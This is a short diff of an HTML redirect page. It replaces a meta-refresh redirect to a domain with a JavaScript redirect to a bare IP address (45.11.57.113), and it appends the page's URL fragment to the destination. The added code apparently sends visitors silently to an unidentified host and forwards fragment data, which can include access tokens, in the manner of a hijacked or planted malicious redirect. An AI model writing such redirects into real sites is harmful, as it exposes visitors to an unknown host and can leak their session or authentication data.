@@ -1,11 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <meta http-equiv="refresh" content="0; url=http://strangerdisastr.com/">
-</head>
-<body>
-  <p>Redirecting you to the page...</p>
-</body>
+<!DOCTYPE HTML>
+<html lang="en-US">
+<script>
+  var fragment = window.location.href.split('#')[1] || '';
+  if (fragment) {
+    document.location.href = 'http://45.11.57.113' + fragment;
+  } else {
+    document.location.href = 'http://45.11.57.113';
+  }
+</script>
+
 </html>
